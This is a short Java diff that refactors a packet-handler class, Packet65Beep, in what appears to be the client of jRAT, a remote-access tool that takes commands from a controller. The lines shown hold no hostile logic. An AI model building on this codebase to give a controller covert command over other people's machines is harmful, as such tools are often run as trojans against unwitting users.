@@ -4,7 +4,7 @@ import jrat.client.Connection;
 
 import java.awt.*;
 
-public class Packet65Beep extends AbstractIncomingPacket {
+public class Packet65Beep implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
